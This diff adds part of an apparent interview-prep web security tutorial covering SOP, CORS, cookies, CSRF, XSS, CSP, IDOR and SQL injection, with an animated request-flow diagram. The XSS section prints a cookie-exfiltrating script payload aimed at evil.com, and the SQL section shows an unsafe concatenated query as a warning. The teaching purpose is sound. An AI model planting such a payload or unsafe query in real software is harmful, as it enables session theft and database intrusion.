+          <text x="615" y="312" text-anchor="middle" fill="#ffb703" font-family="monospace" font-size="10">INSERT INTO orders (…) VALUES (@p1, @p2)</text>
+          <text x="615" y="330" text-anchor="middle" fill="#a3b1c8" font-family="monospace" font-size="9">parameterised · least-priv DB user · TLS</text>
+        </g>
+        <g id="m6" class="a-el a-hidden">
+          <path d="M 770,360 L 460,360" stroke="#ff9900" stroke-width="2" fill="none" marker-end="url(#mA)"/>
+          <text x="615" y="352" text-anchor="middle" fill="#ffd166" font-family="monospace" font-size="10">rows(1)  order-id=42</text>
+        </g>
+        <g id="m7" class="a-el a-hidden">
+          <path d="M 440,400 L 130,400" stroke="#2dc653" stroke-width="2" fill="none" marker-end="url(#mA)"/>
+          <text x="285" y="392" text-anchor="middle" fill="#9be7a3" font-family="monospace" font-size="10">201 Created  · Access-Control-Allow-Origin: portal.example.com</text>
+          <text x="285" y="410" text-anchor="middle" fill="#a3b1c8" font-family="monospace" font-size="9">CSP · HSTS · X-Content-Type-Options · Referrer-Policy</text>
+        </g>
+        <g id="m8" class="a-el a-hidden">
+          <rect x="30"  y="420" width="180" height="30" rx="6" fill="#12331d" stroke="#2dc653"/>
+          <text x="120" y="440" text-anchor="middle" fill="#9be7a3" font-family="sans-serif" font-size="10">Browser: SOP + CORS + CSP → JS sees the 201</text>
+        </g>
+      </svg>
+
+      <div class="anim-controls">
+        <button data-act="play">▶ Play</button>
+        <button data-act="next"  class="secondary">Step →</button>
+        <button data-act="prev"  class="secondary">← Back</button>
+        <button data-act="reset" class="secondary">↺ Reset</button>
+        <span class="anim-step-label">Ready</span>
+        <span class="anim-step-caption">Press ▶ Play to start</span>
+      </div>
+    </div>
+
+    <script>
+    (function () {
+      const root = document.getElementById('anim1');
+      if (!root) return;
+      const $  = (sel) => root.querySelector(sel);
+      const label = $('.anim-step-label');
+      const cap   = $('.anim-step-caption');
+      const btnPlay = root.querySelector('[data-act="play"]');
+      const btnNext = root.querySelector('[data-act="next"]');
+      const btnPrev = root.querySelector('[data-act="prev"]');
+      const btnReset= root.querySelector('[data-act="reset"]');
+
+      const CFG = {
+        intro: 'Follow one authenticated cross-origin POST through every trust boundary.',
+        interval: 1900,
+        reset: (r) => {
+          ['#m1','#m2','#m3','#m4','#m5','#m6','#m7','#m8'].forEach(id => r.querySelector(id).classList.add('a-hidden'));
+        },
+        steps: [
+          { caption: 'Browser sees a cross-origin POST with Authorization + JSON body → sends OPTIONS preflight.',
+            apply: () => $('#m1').classList.remove('a-hidden') },
+          { caption: 'API replies 204 with the exact origin allowed, methods, headers, credentials and Max-Age.',
+            apply: () => $('#m2').classList.remove('a-hidden') },
+          { caption: 'Preflight passed. Browser sends the real POST /orders with cookie + bearer + CSRF token.',
+            apply: () => $('#m3').classList.remove('a-hidden') },
+          { caption: 'API runs its own gates in order: authenticate, authorize object, validate CSRF token, validate input.',
+            apply: () => $('#m4').classList.remove('a-hidden') },
+          { caption: 'Business logic issues a parameterised query over a private connection using a least-privilege DB user.',
+            apply: () => $('#m5').classList.remove('a-hidden') },
+          { caption: 'DB returns the new row. No string concatenation ever touched user input — SQL injection impossible.',
+            apply: () => $('#m6').classList.remove('a-hidden') },
+          { caption: 'API returns 201 with CORS headers echoing the origin, and security headers (CSP, HSTS, X-CTO).',
+            apply: () => $('#m7').classList.remove('a-hidden') },
+          { caption: 'Browser checks SOP + CORS + CSP; JavaScript on portal.example.com can read the response.',
+            apply: () => $('#m8').classList.remove('a-hidden') }
+        ]
+      };
+
+      let idx = -1, playing = false, timer = null;
+      function goto(i) {
+        if (i < 0 || i >= CFG.steps.length) return;
+        CFG.reset(root);
+        for (let k = 0; k <= i; k++) CFG.steps[k].apply(root);
+        idx = i;
+        label.textContent = `Step ${i + 1}/${CFG.steps.length}`;
+        cap.textContent = CFG.steps[i].caption;
+      }
+      function reset() {
+        idx = -1; playing = false;
+        if (timer) { clearTimeout(timer); timer = null; }
+        CFG.reset(root);
+        label.textContent = 'Ready';
+        cap.textContent = CFG.intro;
+        btnPlay.textContent = '▶ Play';
+      }
+      function play() {
+        if (playing) { playing = false; if (timer) clearTimeout(timer); btnPlay.textContent = '▶ Play'; return; }
+        if (idx >= CFG.steps.length - 1) reset();
+        playing = true; btnPlay.textContent = '⏸ Pause';
+        function tick() {
+          if (!playing) return;
+          if (idx + 1 < CFG.steps.length) goto(idx + 1);
+          if (idx < CFG.steps.length - 1) timer = setTimeout(tick, CFG.interval);
+          else { playing = false; btnPlay.textContent = '▶ Replay'; }
+        }
+        timer = setTimeout(tick, 400);
+      }
+      btnPlay.addEventListener('click', play);
+      btnReset.addEventListener('click', reset);
+      btnNext && btnNext.addEventListener('click', () => {
+        if (playing) { playing = false; if (timer) clearTimeout(timer); btnPlay.textContent = '▶ Play'; }
+        goto(idx + 1);
+      });
+      btnPrev && btnPrev.addEventListener('click', () => {
+        if (playing) { playing = false; if (timer) clearTimeout(timer); btnPlay.textContent = '▶ Play'; }
+        goto(idx - 1);
+      });
+      reset();
+    })();
+    </script>
+  </section>
+
+  <!-- ============================ DEEP DIVE ============================ -->
+  <section id="deep" class="card">
+    <h2>🔍 Deep-dive — every concept, in order</h2>
+
+    <!-- 1. ORIGIN -->
+    <h3>1. Origin = scheme + host + port</h3>
+    <p>An <strong>origin</strong> is the triple <code>(scheme, host, port)</code>. Two URLs share an origin if all three match exactly. Every browser security concept in this page hangs off this definition, so nailing it down first is worth the two paragraphs.</p>
+    <table>
+      <tr><th>URL A</th><th>URL B</th><th>Same origin?</th><th>Why</th></tr>
+      <tr><td><code>https://example.com/a</code></td><td><code>https://example.com/b</code></td><td>✅ yes</td><td>Path doesn't affect origin</td></tr>
+      <tr><td><code>https://example.com</code></td><td><code>https://api.example.com</code></td><td>❌ no</td><td>Host differs</td></tr>
+      <tr><td><code>http://example.com</code></td><td><code>https://example.com</code></td><td>❌ no</td><td>Scheme differs</td></tr>
+      <tr><td><code>https://example.com</code></td><td><code>https://example.com:8443</code></td><td>❌ no</td><td>Port differs</td></tr>
+      <tr><td><code>http://localhost:3000</code></td><td><code>http://localhost:5000</code></td><td>❌ no</td><td>Port differs — local dev bites here</td></tr>
+    </table>
+
+    <h4>Origin vs. Site vs. Host vs. Domain</h4>
+    <p>These are not synonyms. Different browser concepts use different definitions, which is a real source of interview confusion.</p>
+    <ul>
+      <li><strong>Host</strong> — the hostname alone. <code>portal.example.com</code>.</li>
+      <li><strong>Domain</strong> — the DNS name. <code>example.com</code> or <code>portal.example.com</code>. Not a security concept per se.</li>
+      <li><strong>Origin</strong> — <code>scheme + host + port</code>. Used by <strong>Same-Origin Policy</strong> and <strong>CORS</strong>.</li>
+      <li><strong>Site</strong> — <code>scheme + registrable domain</code> (e.g. <code>https://example.com</code> covers both <code>portal.example.com</code> and <code>api.example.com</code>). Used by <strong>cookie SameSite</strong>. This is why <code>portal.example.com</code> and <code>api.example.com</code> are <em>different origin</em> but <em>same site</em>.</li>
+    </ul>
+    <div class="callout"><strong>Interview line:</strong> "CORS is enforced on origin. Cookie SameSite is enforced on <em>site</em>. Same-origin implies same-site; the reverse is not true."</div>
+
+    <!-- 2. SOP -->
+    <h3>2. Same-Origin Policy (SOP)</h3>
+    <p>SOP is a browser rule: <strong>JavaScript running in one origin cannot read the response body of a request to another origin</strong>. It is why <code>evil.com</code> can't silently script your bank statement. It is enforced by the browser process — not by your server, not by Postman, not by curl. If SOP didn't exist, every browsing session in every tab would be a data-exfil vector.</p>
+    <p>Two nuances matter for interviews. First, SOP does <em>not</em> forbid making the request — it forbids reading the response. The request often leaves the browser and hits the target server; the browser just refuses to let script see what came back. Second, SOP is not absolute — a small set of "safe" side effects (form submissions, image loads, <code>&lt;script&gt;</code> tag loads) are historically allowed for backwards compatibility, which is where CSRF creeps in.</p>
+    <div class="viz">evil.com  ─── JS fetch("https://bank.com/balance") ───►  bank.com
+                                                                  │
+                                                                  │  200 OK { balance: 5000 }
+                                                                  ▼
+     ✗ Browser refuses to expose response body to evil.com's JS (SOP)</div>
+
+    <!-- 3. CORS -->
+    <h3>3. CORS — the server's controlled opt-in to SOP relaxation</h3>
+    <p>CORS is a set of response headers the server sends to tell the browser "this specific other origin may see this response". It is <em>not</em> a security feature on the server side — it is a permission the server grants to the browser. The browser is the one that enforces it. Written headers:</p>
+    <table>
+      <tr><th>Header</th><th>Direction</th><th>What it says</th></tr>
+      <tr><td><code>Origin</code></td><td>Request (browser)</td><td>"I am serving script from this origin — is that OK?"</td></tr>
+      <tr><td><code>Access-Control-Allow-Origin</code></td><td>Response (server)</td><td>The specific origin the server permits. <em>Never</em> <code>*</code> with credentials.</td></tr>
+      <tr><td><code>Access-Control-Allow-Credentials</code></td><td>Response (server)</td><td><code>true</code> if cookies/HTTP-auth may accompany the request. Requires an explicit origin, not <code>*</code>.</td></tr>
+      <tr><td><code>Access-Control-Allow-Methods</code></td><td>Response (preflight)</td><td>Which HTTP methods are permitted.</td></tr>
+      <tr><td><code>Access-Control-Allow-Headers</code></td><td>Response (preflight)</td><td>Which non-safelisted request headers are permitted.</td></tr>
+      <tr><td><code>Access-Control-Expose-Headers</code></td><td>Response</td><td>Which response headers JS may read (default is a small safelist).</td></tr>
+      <tr><td><code>Access-Control-Max-Age</code></td><td>Response (preflight)</td><td>Seconds the browser may cache the preflight verdict.</td></tr>
+      <tr><td><code>Vary: Origin</code></td><td>Response</td><td>Cache-key hint — CDNs must not share responses across origins.</td></tr>
+    </table>
+
+    <!-- 4. Postman -->
+    <h3>4. "Why does it work in Postman but fail in the browser?"</h3>
+    <p>Because Postman is not a browser. SOP and CORS are browser features — they exist to protect a user whose browser is running untrusted code from multiple origins concurrently. Postman, curl, mobile apps, server-to-server calls, and Node scripts do not enforce SOP because they are not sandboxing untrusted code — they are the user's own tool making a single deliberate request.</p>
+    <div class="callout warn"><strong>Precise wording matters.</strong> "The API call never reached the server because of CORS" is wrong for <em>simple</em> requests — the browser does send them, receives the response, then refuses to let JS read it. For requests that require preflight, the browser may indeed decide not to send the real request if the OPTIONS response fails. Both patterns present as "CORS error" in the console. Learn to read the Network tab.</div>
+
+    <!-- 5. Preflight -->
+    <h3>5. Preflight requests — OPTIONS as a permission check</h3>
+    <p>The browser sends an OPTIONS request <em>before</em> the real one whenever the request would exceed the "simple request" envelope. Simple requires: method in <code>{GET, HEAD, POST}</code>, only safelisted request headers, and <code>Content-Type</code> in <code>{application/x-www-form-urlencoded, multipart/form-data, text/plain}</code>. Anything else — <code>PUT</code>, <code>DELETE</code>, <code>Authorization</code> header, JSON body — triggers preflight.</p>
+    <div class="viz">Browser                                                       API
+   │                                                          │
+   │  OPTIONS /orders                                         │
+   │  Origin: https://portal.example.com                      │
+   │  Access-Control-Request-Method: POST                     │
+   │  Access-Control-Request-Headers: Authorization, Content-Type
+   │─────────────────────────────────────────────────────────►│
+   │                                                          │
+   │              204 No Content                              │
+   │              Access-Control-Allow-Origin: https://portal.example.com
+   │              Access-Control-Allow-Methods: GET,POST,PUT,DELETE
+   │              Access-Control-Allow-Headers: Authorization,Content-Type
+   │              Access-Control-Allow-Credentials: true      │
+   │              Access-Control-Max-Age: 600                 │
+   │◄─────────────────────────────────────────────────────────│
+   │                                                          │
+   │  POST /orders  (the real request)                        │
+   │─────────────────────────────────────────────────────────►│
+   │              201 Created                                 │
+   │◄─────────────────────────────────────────────────────────│</div>
+    <p>Two operational rules: (1) authentication middleware must not 401 the <code>OPTIONS</code> request — it carries no credentials by design; typically you short-circuit OPTIONS in a middleware before auth runs. (2) set a reasonable <code>Max-Age</code> (5–10 minutes) so every JSON POST doesn't take a round-trip hit.</p>
+
+    <!-- 6. CORS is not auth -->
+    <h3>6. CORS is not authentication and it is not authorization</h3>
+    <p>A stubborn myth in every code review: "we don't need to protect that endpoint, CORS blocks it". CORS blocks <em>a browser's JavaScript from reading the response</em>. It does not stop <code>curl</code>, Postman, a mobile app, a scraper, an attacker with a laptop and 10 seconds of Python. Every endpoint must authenticate and authorise its callers <strong>independently of CORS</strong>. CORS lives on the browser boundary; auth lives on the API boundary.</p>
+    <div class="callout warn">CORS keeps <em>legitimate browser JS</em> honest. It does not keep <em>attackers</em> honest. That is not what it was designed for.</div>
+
+    <!-- 7. CORS configuration -->
+    <h3>7. Production-safe CORS configuration</h3>
+    <p>Configure an explicit allow-list of origins, never <code>*</code> for authenticated APIs. Reflect the request's <code>Origin</code> only if it matches the allow-list. Set <code>Vary: Origin</code> so caches don't leak allowed-origin responses to disallowed callers.</p>
+    <pre><span class="cmt"># A safe CORS policy expressed as pseudo-config</span>
+AllowedOrigins:
+  - https://portal.example.com
+  - https://admin.example.com
+AllowedMethods: [GET, POST, PUT, PATCH, DELETE]
+AllowedHeaders: [Content-Type, Authorization, X-CSRF-Token, X-Request-Id]
+ExposeHeaders:  [X-Request-Id, X-Rate-Limit-Remaining]
+AllowCredentials: true
+MaxAge: 600
+Vary: Origin</pre>
+    <p>Two hard rules from the MDN spec: (a) <code>Access-Control-Allow-Credentials: true</code> is incompatible with <code>*</code> — the server <em>must</em> echo a specific origin. (b) Do not reflect an arbitrary <code>Origin</code> — always validate against an allow-list, otherwise you have effectively re-enabled the wildcard for any attacker origin that guesses your header logic.</p>
+
+    <!-- 8. Cookies -->
+    <h3>8. Cookies — the classic auth transport</h3>
+    <p>A cookie is a small key/value the server sets via <code>Set-Cookie</code>, that the browser stores and sends back on every subsequent request to the same host. For authentication, this is either a session identifier (opaque, looked up server-side) or a signed token. The security properties you care about are all attributes on the cookie:</p>
+    <table>
+      <tr><th>Attribute</th><th>Meaning</th><th>Why</th></tr>
+      <tr><td><code>HttpOnly</code></td><td>JavaScript cannot read the cookie via <code>document.cookie</code>.</td><td>Blocks XSS from directly stealing the session cookie.</td></tr>
+      <tr><td><code>Secure</code></td><td>Only sent over HTTPS.</td><td>Prevents leak over plain HTTP hops.</td></tr>
+      <tr><td><code>SameSite=Lax</code></td><td>Sent on top-level navigations but not on cross-site subresources.</td><td>Kills most CSRF automatically.</td></tr>
+      <tr><td><code>SameSite=Strict</code></td><td>Never sent from cross-site contexts.</td><td>Maximum CSRF protection; breaks external-link logins.</td></tr>
+      <tr><td><code>SameSite=None; Secure</code></td><td>Sent cross-site over HTTPS.</td><td>Required for federated login / cross-origin auth.</td></tr>
+      <tr><td><code>Domain</code></td><td>Hosts allowed to receive the cookie.</td><td>Scope tightly; <code>example.com</code> shares with all subdomains.</td></tr>
+      <tr><td><code>Path</code></td><td>URL prefix required.</td><td>Minor scoping — not a security control.</td></tr>
+      <tr><td><code>Max-Age</code> / <code>Expires</code></td><td>How long the browser keeps it.</td><td>Short lifetime + refresh tokens beats one long-lived cookie.</td></tr>
+    </table>
+
+    <!-- 9. SameSite vs Same-Origin -->
+    <h3>9. SameSite ≠ Same-Origin</h3>
+    <p>Same-origin means "identical <code>scheme + host + port</code>". Same-site means "same registrable domain + scheme". <code>portal.example.com</code> and <code>api.example.com</code> are different origins but the same site — so a SameSite=Lax cookie on <code>example.com</code> <strong>will</strong> be sent from portal to api even though CORS treats them as cross-origin. That mismatch is exactly what makes SameSite a useful CSRF control while CORS keeps the origin boundary honest.</p>
+
+    <!-- 10. Cookie vs Bearer -->
+    <h3>10. Cookie session vs Bearer token — the real trade-off</h3>
+    <p>Two common auth transports for SPAs. Both are legitimate. They fail in different directions.</p>
+    <table>
+      <tr><th></th><th>Cookie session</th><th>Bearer token (Authorization header)</th></tr>
+      <tr><td>How it's sent</td><td>Automatically by browser on same-site requests</td><td>Explicitly by JS on every request</td></tr>
+      <tr><td>XSS risk</td><td>Low — HttpOnly hides it from JS</td><td>High — JS can read from <code>localStorage</code> or memory</td></tr>
+      <tr><td>CSRF risk</td><td>High — needs SameSite + CSRF token</td><td>Low — attacker's script can't attach it without XSS</td></tr>
+      <tr><td>Cross-origin</td><td>Requires <code>credentials: include</code> + strict CORS</td><td>Just add a header</td></tr>
+      <tr><td>Revocation</td><td>Server-side session store</td><td>Short JWT TTL + refresh + optional deny-list</td></tr>
+      <tr><td>Best for</td><td>First-party web app, one company's UI+API</td><td>Third-party API access, mobile clients, microservices</td></tr>
+    </table>
+    <div class="callout"><strong>Practical guidance.</strong> For a first-party SPA on the same registrable domain: HttpOnly cookies with SameSite=Lax + CSRF token. For a public API with third-party integrations or mobile clients: short-lived JWTs held in memory, refresh via a secure http-only refresh cookie. Do not store long-lived tokens in localStorage — one XSS bug ends the game.</div>
+
+    <!-- 11. CSRF -->
+    <h3>11. CSRF — forged authenticated actions</h3>
+    <p>Cross-Site Request Forgery abuses the fact that browsers <em>automatically</em> attach cookies to requests, regardless of which page initiated them. If <code>evil.com</code> can cause your browser to send a POST to <code>bank.com/transfer</code> — via a hidden form, a redirect, an <code>&lt;img&gt;</code> tag, whatever — the cookie tags along and the bank sees an authenticated request. The attacker doesn't get to read the response (SOP still blocks that), but a "transfer money" action doesn't require a readable response to succeed.</p>
+    <div class="diagram">
+      <svg viewBox="0 0 900 260" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="mC" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+            <path d="M0,0 L10,5 L0,10 z" fill="#7aa2f7"/>
+          </marker>
+        </defs>
+        <g font-family="sans-serif" font-size="12" fill="#e7ecf3">
+          <rect x="30"  y="100" width="140" height="60" rx="10" fill="#2a3652" stroke="#7aa2f7"/>
+          <text x="100" y="126" text-anchor="middle" font-weight="700">User's browser</text>
+          <text x="100" y="146" text-anchor="middle" fill="#a3b1c8" font-size="10">logged in to bank.com</text>
+
+          <rect x="220" y="30"  width="160" height="60" rx="10" fill="#3a1220" stroke="#f7567c"/>
+          <text x="300" y="56"  text-anchor="middle" font-weight="700" fill="#ff9dbb">evil.com</text>
+          <text x="300" y="76"  text-anchor="middle" fill="#a3b1c8" font-size="10">hidden form / img trick</text>
+
+          <rect x="220" y="180" width="160" height="60" rx="10" fill="#12331d" stroke="#2dc653"/>
+          <text x="300" y="206" text-anchor="middle" font-weight="700" fill="#9be7a3">bank.com</text>
+          <text x="300" y="226" text-anchor="middle" fill="#a3b1c8" font-size="10">POST /transfer</text>
+
+          <rect x="440" y="100" width="200" height="60" rx="10" fill="#183a24" stroke="#2dc653"/>
+          <text x="540" y="126" text-anchor="middle" font-weight="700" fill="#9be7a3">bank.com/transfer</text>
+          <text x="540" y="146" text-anchor="middle" fill="#a3b1c8" font-size="10">"authenticated" — cookie attached</text>
+
+          <rect x="700" y="100" width="170" height="60" rx="10" fill="#3a2a12" stroke="#ff9900"/>
+          <text x="785" y="126" text-anchor="middle" font-weight="700" fill="#ffb703">Money moved</text>
+          <text x="785" y="146" text-anchor="middle" fill="#a3b1c8" font-size="10">victim never clicked</text>
+        </g>
+        <g stroke="#7aa2f7" stroke-width="1.8" fill="none" marker-end="url(#mC)">
+          <path d="M 170,130 L 220,60"/>
+          <path d="M 300,90  L 300,180"/>
+          <path d="M 380,210 L 440,140"/>
+          <path d="M 640,130 L 700,130"/>
+        </g>
+      </svg>
+    </div>
+    <p>Defences layer nicely. <strong>SameSite=Lax</strong> stops the browser from attaching the cookie on cross-site subresource requests, which kills the classical form-post attack. <strong>Anti-CSRF token</strong> (a per-session random value embedded in the page, echoed as a header on every mutating request) means the attacker cannot forge a valid request even if the cookie flows — because they cannot read the token (SOP forbids it). <strong>Origin/Referer validation</strong> at the server rejects mutating requests whose <code>Origin</code> is not on the allow-list. <strong>Re-authentication</strong> for highly sensitive actions (transfer, password change) is the cherry on top.</p>
+    <div class="callout warn"><strong>HttpOnly does not stop CSRF.</strong> HttpOnly stops <em>JavaScript</em> from reading the cookie. The browser attaches the cookie on its own without JS ever touching it. CSRF exploits the browser's auto-attach behaviour, not JS access.</div>
+
+    <!-- 12. CORS vs CSRF -->
+    <h3>12. CORS vs CSRF — different problems, different solutions</h3>
+    <table>
+      <tr><th>Aspect</th><th>CORS</th><th>CSRF</th></tr>
+      <tr><td>What it controls</td><td>Whether cross-origin JS can <strong>read</strong> a response</td><td>Whether cross-site requests can <strong>trigger authenticated actions</strong></td></tr>
+      <tr><td>Enforced by</td><td>Browser (server opts in with headers)</td><td>Server (validates token / origin) + browser (SameSite cookie)</td></tr>
+      <tr><td>Defends against</td><td>Data theft via cross-origin JS reads</td><td>Forged writes on behalf of the user</td></tr>
+      <tr><td>Does correct CORS solve the other?</td><td colspan="2">No. A CORS-blocked simple request still <em>reaches</em> the server, so a CSRF write can still succeed. You need both.</td></tr>
+    </table>
+
+    <!-- 13. XSS -->
+    <h3>13. XSS — attacker code inside a trusted origin</h3>
+    <p>Cross-Site Scripting means the attacker managed to inject JavaScript that runs <strong>as your origin</strong>. From the browser's point of view the script is legitimate — it came from <code>portal.example.com</code>, so SOP allows it to read anything, CORS lets it call your API with cookies, CSP might be its only remaining barrier. XSS is a category killer because most other controls assume script in your origin is trusted.</p>
+    <div class="viz">Attacker input      "&lt;script&gt;fetch('//evil.com/'+document.cookie)&lt;/script&gt;"
+      │
+      ▼
+Server saves it (no encoding)
+      │
+      ▼
+Later render:  &lt;div&gt;{{ userComment }}&lt;/div&gt;      ← template inserts raw HTML
+      │
+      ▼
+Victim visits page
+      │
+      ▼
+Browser parses &lt;script&gt;…&lt;/script&gt; and executes it AS portal.example.com
+      │
+      ▼
+Attacker's JS reads cookie / calls API / exfiltrates data</div>
+    <p>Three flavours, one problem:</p>
+    <ul>
+      <li><strong>Stored XSS</strong> — payload lives in your DB (a profile bio, a comment, a review). Every subsequent viewer runs it.</li>
+      <li><strong>Reflected XSS</strong> — payload lives in the URL/query and is echoed straight back in the response. Delivered by a phishing link.</li>
+      <li><strong>DOM-based XSS</strong> — no server involvement. Client-side JS does something like <code>el.innerHTML = location.hash</code> and the browser executes what's in the URL fragment.</li>
+    </ul>
+
+    <!-- 14. XSS Prevention -->
+    <h3>14. XSS prevention — three independent lines</h3>
+    <p>These are <em>not</em> interchangeable. Each covers a different failure mode.</p>
+    <ul>
+      <li><strong>Context-aware output encoding.</strong> Whenever untrusted data is written into HTML/JS/CSS/URL context, encode it for that context. Angular/React/Blazor do this automatically for interpolated bindings — <em>don't bypass</em> with <code>[innerHTML]</code>, <code>bypassSecurityTrust*</code>, or <code>dangerouslySetInnerHTML</code>.</li>
+      <li><strong>Input validation.</strong> Reject shapes that don't fit your business rules (e.g. an integer field with letters). Validation ≠ sanitization; a string containing <code>&lt;script&gt;</code> may be perfectly valid for a comment field.</li>
+      <li><strong>HTML sanitization.</strong> Only when you <em>need</em> to render user-supplied HTML (rich-text editor, markdown). Use a proven allow-list sanitizer like DOMPurify, not homegrown regex.</li>
+    </ul>
+    <p>Dangerous APIs to grep for in code review: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>Function()</code>, jQuery <code>.html()</code>, React <code>dangerouslySetInnerHTML</code>, Angular <code>bypassSecurityTrustHtml</code>. Each is a legitimate tool with legitimate uses — every use with untrusted input is a bug.</p>
+
+    <!-- 15. CSP -->
+    <h3>15. Content Security Policy — the defense-in-depth for XSS</h3>
+    <p>CSP is a response header that tells the browser "only load resources from these approved sources; refuse everything else". Even if an attacker injects a <code>&lt;script&gt;</code> tag, the browser will not execute it unless CSP allows the source.</p>
+    <pre>Content-Security-Policy:
+    default-src <span class="str">'self'</span>;
+    script-src  <span class="str">'self'</span> <span class="str">'nonce-r4nd0m'</span>;
+    style-src   <span class="str">'self'</span> <span class="str">'unsafe-inline'</span>;
+    img-src     <span class="str">'self'</span> data: https://cdn.example.com;
+    connect-src <span class="str">'self'</span> https://api.example.com;
+    frame-ancestors <span class="str">'none'</span>;
+    object-src <span class="str">'none'</span>;
+    base-uri   <span class="str">'self'</span>;
+    report-to  csp-endpoint;</pre>
+    <p>Directive cheat-sheet:</p>
+    <ul>
+      <li><code>default-src</code> — fallback for everything not explicitly set.</li>
+      <li><code>script-src</code> — where JS may come from. Use <code>'nonce-xxx'</code> per response instead of <code>'unsafe-inline'</code>.</li>
+      <li><code>connect-src</code> — where <code>fetch</code>/<code>XHR</code>/<code>WebSocket</code> may connect. Your API's origin lives here.</li>
+      <li><code>img-src</code>, <code>style-src</code>, <code>font-src</code>, <code>media-src</code> — self-explanatory.</li>
+      <li><code>frame-ancestors</code> — who may embed <em>this</em> page in a frame. Modern clickjacking control.</li>
+      <li><code>object-src 'none'</code> — kill legacy Flash/Java plugin sinks.</li>
+      <li><code>base-uri 'self'</code> — prevent injected <code>&lt;base&gt;</code> tags from hijacking relative URLs.</li>
+      <li><code>report-to</code> — where the browser POSTs a report when it blocks something.</li>
+    </ul>
+    <div class="callout"><strong>CSP is not a cure for XSS.</strong> It is a mitigation. It shrinks what a successful XSS can do — often to "steal a nonce-less inline injection", which is much less bad. Encode your output first; add CSP as a safety net.</div>
+
+    <!-- 16. Clickjacking -->
+    <h3>16. Clickjacking</h3>
+    <p>Attacker embeds your logged-in page in a transparent iframe on <code>evil.com</code>, positions a decoy button on top of your "Transfer $10 000" button, and tricks the user into clicking. Your page runs the action, the user thinks they clicked "Continue".</p>
+    <p>Defence: refuse to be framed. The modern way is <code>frame-ancestors</code> in CSP (<code>frame-ancestors 'self';</code> or <code>frame-ancestors 'none';</code>). The legacy header is <code>X-Frame-Options: DENY | SAMEORIGIN</code>. Send both if you support older browsers; CSP wins where both are present.</p>
+
+    <!-- 17. Security headers -->
+    <h3>17. Security headers — one line each</h3>
+    <table>
+      <tr><th>Header</th><th>Role</th></tr>
+      <tr><td><code>Strict-Transport-Security</code> (HSTS)</td><td>Tell browsers "only load me over HTTPS for the next N seconds". Kills protocol-downgrade attacks.</td></tr>
+      <tr><td><code>Content-Security-Policy</code></td><td>What can execute / load / connect. XSS mitigation.</td></tr>
+      <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>Refuse to guess a response's MIME type. Blocks "upload .jpg containing HTML → treated as HTML" tricks.</td></tr>
+      <tr><td><code>Referrer-Policy: no-referrer-when-downgrade</code> (or stricter)</td><td>Limit what the <code>Referer</code> header leaks to third parties.</td></tr>
+      <tr><td><code>Permissions-Policy</code></td><td>Disable APIs (camera, geolocation, USB) your app doesn't use.</td></tr>
+      <tr><td><code>X-Frame-Options</code></td><td>Legacy clickjacking header; superseded by <code>frame-ancestors</code>.</td></tr>
+    </table>
+
+    <!-- 18. Auth -->
+    <h3>18. API authentication</h3>
+    <p>Every API request must be authenticated — CORS is not a substitute. Three common shapes on the wire:</p>
+    <ul>
+      <li><strong>Session cookie</strong> — server issues an opaque ID, keeps state in Redis/DB. Simple, easy to revoke, requires CSRF protection.</li>
+      <li><strong>JWT bearer</strong> — signed token carries claims; API validates signature and expiry statelessly. Convenient across microservices; revocation is harder.</li>
+      <li><strong>OAuth2 / OIDC access token</strong> — a JWT (or opaque) issued by an identity provider (Cognito, Okta, Auth0). Standardised, federated, works for third-party clients.</li>
+    </ul>
+    <p>The choice affects how the browser attaches credentials (auto for cookies; JS-attached for bearer) which in turn affects CSRF exposure and CORS credentials handling. It does not change the rule: <em>authenticate every request</em>.</p>
+
+    <!-- 19. Authorization -->
+    <h3>19. Authorization — the object-level check the browser can't help with</h3>
+    <p>Authentication says <em>who</em>; authorization says <em>what they may do</em>. The class of bug called <strong>IDOR/BOLA</strong> (Insecure Direct Object Reference / Broken Object Level Authorization) is a top-3 API vulnerability every year: the API authenticates the user but forgets to check that the object they're asking for belongs to them.</p>
+    <div class="viz">GET /users/101/orders/500
+      ├─ AuthN: is the JWT valid? → user_id = 101   ✓
+      └─ AuthZ: does user 101 own order 500?         ← easy to forget
+                  │
+              ┌───┴───┐
+              yes    no
+              │       │
+              200    403</div>
+    <p>Do <strong>not</strong> assume the UI hides the ID. Any attacker can flip <code>500</code> to <code>501</code> in a URL. Enforce object ownership at the server, ideally with a query that includes the owner in the <code>WHERE</code> clause (<code>WHERE order_id = @p1 AND owner_id = @currentUser</code>).</p>
+    <div class="callout warn"><strong>UI controls are usability, not security.</strong> Hiding a delete button in the SPA is a UX choice. The API endpoint must independently deny unauthorised deletes.</div>
+
+    <!-- 20. Input validation -->
+    <h3>20. Input validation — server-side is mandatory</h3>
+    <p>Client-side validation improves UX. It cannot be relied on for security because <em>every</em> byte the client sends is under attacker control (Postman, curl, browser DevTools, custom script). Server-side validation must independently:</p>
+    <ul>
+      <li>Check <strong>type</strong> and <strong>shape</strong> (JSON schema, DataAnnotations, FluentValidation).</li>
+      <li>Enforce <strong>ranges</strong>, <strong>lengths</strong>, <strong>allow-lists</strong>.</li>
+      <li>Reject <strong>unexpected fields</strong> to prevent mass-assignment.</li>
+      <li>Canonicalize before comparing (Unicode normalization, case).</li>
+      <li>Enforce <strong>business rules</strong> (e.g. "amount &gt; 0" and "amount ≤ available balance").</li>
+    </ul>
+
+    <!-- 21. SQL Injection -->
+    <h3>21. SQL Injection — never let user input become SQL</h3>
+    <p>SQL injection happens when user input is concatenated into a SQL string. The fix is universally the same: <strong>parameterised queries</strong>. The client library sends the SQL text and the parameter values separately; the DB engine parses the SQL first, then binds the values. No amount of quoting or escaping is safer than parameterisation.</p>
+    <pre><span class="cmt">// DANGER — user input is glued into SQL</span>
+<span class="kw">var</span> sql = <span class="str">"SELECT * FROM users WHERE email = '"</span> + email + <span class="str">"'"</span>;
+
+<span class="cmt">// SAFE — parameterised (ADO.NET, Dapper, EF Core all default to this)</span>
+<span class="kw">var</span> sql = <span class="str">"SELECT * FROM users WHERE email = @email"</span>;
+db.Query(sql, <span class="kw">new</span> { email });</pre>
+    <p>Belt-and-braces controls: use an ORM that parameterises by default, validate input shape, run the DB user with least privilege (no <code>DROP</code>, no <code>CREATE USER</code>, no schemas it doesn't need), enable query logging + anomaly alerts, and turn on RDS Performance Insights / pg_stat_statements to catch weird queries.</p>
